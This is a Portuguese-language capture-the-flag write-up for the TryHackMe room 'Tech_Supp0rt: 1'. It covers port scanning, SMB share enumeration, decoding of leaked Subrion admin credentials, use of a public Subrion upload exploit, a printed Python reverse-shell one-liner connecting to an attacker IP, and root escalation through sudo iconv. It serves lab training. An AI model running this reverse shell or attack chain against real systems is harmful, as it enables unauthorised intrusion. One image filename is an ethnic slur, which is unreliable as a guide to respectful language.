# THM - Tech_Supp0rt: 1

![banner.png](THM%20-%20Tech_Supp0rt%201/51d6cbde-11d0-4759-8afc-226295e2e918.png)

primeiro comecei com um scan de portas básico usando o nmap, e no resultado me retornou as portas 22, 80, 138/445. então vemos que já temos um SMB aqui.

`nmap -sV -sC -T4 -Pn 10.201.17.99` 

```jsx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 10:26 EDT
Nmap scan report for 10.201.17.99
Host is up (0.28s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-14T14:26:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-10-14T19:56:50+05:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.50 seconds
```

logo após o portscan já comecei a enumerar os diretórios, e ele me retornou diversos dirs do CMS WordPress (mas ele é apenas um buraco de coelho; você só vai perder tempo se focar demais nele).

`❯ feroxbuster --url [http://10.201.17.99/](http://10.201.17.99/) -m 200`

```jsx
───────────────────────────────────────────────────────────────────────────
                        💀 Scan Management Menu 💀                         
───────────────────────────────────────────────────────────────────────────
                        ⏳ 12 minutes remaining ⏳                         
───────────────────────────────────────────────────────────────────────────
           🦥 Scan limit 1,152,921,504,606,846,975; active 12 🦥           
───────────────────────────────────────────────────────────────────────────
Scans:
  0: running      http://10.201.17.99/
  1: running      http://10.201.17.99/test/
  2: running      http://10.201.17.99/wordpress/
  3: running      http://10.201.17.99/wordpress/wp-admin/
  4: running      http://10.201.17.99/wordpress/wp-content/
  5: complete     http://10.201.17.99/wordpress/wp-includes/
 10: running      http://10.201.17.99/wordpress/wp-admin/user/
 11: complete     http://10.201.17.99/wordpress/wp-admin/includes/
 12: complete     http://10.201.17.99/wordpress/wp-admin/css/
 13: complete     http://10.201.17.99/wordpress/wp-admin/js/
 14: running      http://10.201.17.99/wordpress/wp-content/plugins/
 15: running      http://10.201.17.99/wordpress/wp-content/themes/
 26: complete     http://10.201.17.99/wordpress/wp-includes/pomo/
 33: complete     http://10.201.17.99/wordpress/wp-includes/customize/
 34: complete     http://10.201.17.99/wordpress/wp-includes/Text/
 47: complete     http://10.201.17.99/wordpress/wp-includes/sodium_compat/
 57: complete     http://10.201.17.99/wordpress/wp-includes/js/
 63: complete     http://10.201.17.99/wordpress/wp-includes/random_compat/
 76: complete     http://10.201.17.99/wordpress/wp-admin/images/
 78: complete     http://10.201.17.99/wordpress/wp-content/uploads/
 83: complete     http://10.201.17.99/wordpress/wp-includes/widgets/
 95: complete     http://10.201.17.99/wordpress/wp-includes/block-supports/
106: complete     http://10.201.17.99/wordpress/wp-includes/IXR/
107: complete     http://10.201.17.99/wordpress/wp-includes/theme-compat/
114: complete     http://10.201.17.99/wordpress/wp-includes/PHPMailer/
126: complete     http://10.201.17.99/wordpress/wp-includes/Requests/
130: complete     http://10.201.17.99/wordpress/wp-includes/assets/
209: complete     http://10.201.17.99/wordpress/wp-includes/rest-api/
226: running      http://10.201.17.99/wordpress/wp-includes/css/
367: complete     http://10.201.17.99/wordpress/wp-includes/ID3/
403: complete     http://10.201.17.99/wordpress/wp-includes/block-patterns/
434: complete     http://10.201.17.99/wordpress/wp-includes/sitemaps/
472: complete     http://10.201.17.99/wordpress/wp-includes/fonts/
489: running      http://10.201.17.99/wordpress/wp-includes/blocks/
746: running      http://10.201.17.99/wordpress/wp-admin/network/
749: running      http://10.201.17.99/wordpress/wp-admin/maint/
───────────────────────────────────────────────────────────────────────────
```

no diretório /teste me deparei com essa página de golpe incrivelmente funcional contra velhinhos e leigos.
obs: cuidado com o áudio, pode acabar levando um susto como eu levei.

![pajeet.png](THM%20-%20Tech_Supp0rt%201/c64ab9a8-ba08-48c5-8da8-8b83584ca6ca.png)

voltando ao assunto principal…

enquanto o scan de diretórios rodava, parti para enumerar o SMB usando o enum4linux, onde descobri o share //websvr.

`❯ enum4linux -a 10.201.17.99`

```jsx

[+] Got OS info for 10.201.17.99 from srvinfo: 
	TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
	
//10.201.17.99/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.201.17.99/websvr	Mapping: OK Listing: OK Writing: N/A
//10.201.17.99/IPC$	Mapping: N/A Listing: N/A Writing: N/A

[I] Found new SID: 
S-1-22-1
[I] Found new SID: 
S-1-5-32
[I] Found new SID: 
S-1-5-32
[I] Found new SID: 
S-1-5-32
[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-22-1-1000 Unix User\scamsite (Local User)
```

parti para logar no websvr e verificar se tinha algo. lá dentro encontrei um arquivo de texto onde tinha o user e senha do Subrion, além de uma informação no “goals” avisando que o diretório /subrion não está funcionando.

`❯ smbclient [//10.201.17.99/websvr](https://10.201.17.99/websvr)`

```jsx

smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

		8460484 blocks of size 1024. 5686300 blocks available
smb: \> 
```

`❯ cat enter.txt`

```jsx
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ GOALS
   2   │ =====
   3   │ 1)Make fake popup and host it online on Digital Ocean server
   4   │ 2)Fix subrion site, /subrion doesn't work, edit from panel
   5   │ 3)Edit wordpress website
   6   │ 
   7   │ IMP
   8   │ ===
   9   │ Subrion creds
  10   │ |->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

o que é o Subrion? bom, o próprio site deles dá um ótimo resumo na main-page, que poupa explicações.

![2025-10-14_10-54.png](THM%20-%20Tech_Supp0rt%201/2025-10-14_10-54.png)

novamente voltando ao assunto principal…

ok, agora temos nossa primeira credencial:

```
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
```

no txt tinha a seguinte mensagem “[cooked with magical formula]”, o que dá a entender que essa não é a senha pura. então fui no CyberChef (uma plataforma web de descriptografia/criptografia e decode/encode) e joguei lá para decodar. pelo CyberChef decodamos a senha de base58 para base32 e para base64 até finalmente conseguirmos a senha:**Scam2021**

![2025-10-14_10-59.png](THM%20-%20Tech_Supp0rt%201/2025-10-14_10-59.png)

após isso, fui até `http://10.201.17.99/subrion/panel` e loguei usando as credenciais que peguei.

![2025-10-14_11-28.png](THM%20-%20Tech_Supp0rt%201/4d5c3dda-9468-4eb1-a4cf-0831c1c8d5f2.png)

![2025-10-14_11-30.png](THM%20-%20Tech_Supp0rt%201/2025-10-14_11-30.png)

finalmente dentro do CMS, procurei pela versão do Subrion usada na aplicação.

![2025-10-14_11-31.png](THM%20-%20Tech_Supp0rt%201/2025-10-14_11-31.png)

ao pesquisar essa versão no Google, descobri que ela estava vulnerável, permitindo execução arbitrária de código PHP via uploads.

![2025-10-14_11-31_1.png](THM%20-%20Tech_Supp0rt%201/2025-10-14_11-31_1.png)

[https://github.com/advisories/GHSA-73xj-v6gc-g5p5](https://github.com/advisories/GHSA-73xj-v6gc-g5p5)

exploit in python: [https://packetstorm.news/files/id/162591](https://packetstorm.news/files/id/162591)

aqui podemos pegar shell de duas formas: indo no diretório uploads e criando um arquivo .phar com código malicioso PHP, ou podemos usar um exploit Python que automatiza todo o processo.

![2025-10-14_11-39.png](THM%20-%20Tech_Supp0rt%201/2025-10-14_11-39.png)

abordei a segunda forma. com a webshell em mãos, decidi migrar para uma reverse shell convencional. assim que o script conectou, rodei o seguinte script python:

```jsx
export RHOST="10.8.53.170";export RPORT=1337;
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

com o netcat em outro terminal escutando na porta 1337. conseguido meu acesso a maquina ja dentro parti por rodar o linpeas (um script que automatiza o processo de colher informações e analisar possíveis vetores de escalar privilégio na máquina) sem muitos rodeios para economizar tempo.

```jsx

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/linpeas
├── linpeas_darwin_amd64
├── linpeas_darwin_arm64
├── linpeas_fat.sh
├── linpeas_linux_386
├── linpeas_linux_amd64
├── linpeas_linux_arm
├── linpeas_linux_arm64
├── linpeas.sh
└── linpeas_small.sh
❯ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
```

rodando o linpeas, ele me apontou para uma credencial do WordPress.

![2025-10-15_08-15.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_08-15.png)

primeiro fui logar nesse WordPress para verificar se tinha algo.

![2025-10-15_08-24.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_08-24.png)

acabei perdendo tempo, me preocupando em tentar subir outra shell pelo WordPress quando vi o Hello Dolly nas extensões (algo totalmente desnecessário). no fim, as credenciais do WordPress também serviam para o user “scamsite” na máquina.

![2025-10-15_08-49.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_08-49.png)

daqui para frente foi bem simples: rodei um `sudo -l` que me mostrou um bin com SUID.

![2025-10-15_08-50.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_08-50.png)

então fui até o GTFOBins e procurei pelo `iconv`.

![2025-10-15_08-50_1.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_08-50_1.png)

easy piece! flag coletada e CTF finalizado.

![2025-10-15_09-13.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_09-13.png)

![2025-10-15_09-13_1.png](THM%20-%20Tech_Supp0rt%201/2025-10-15_09-13_1.png)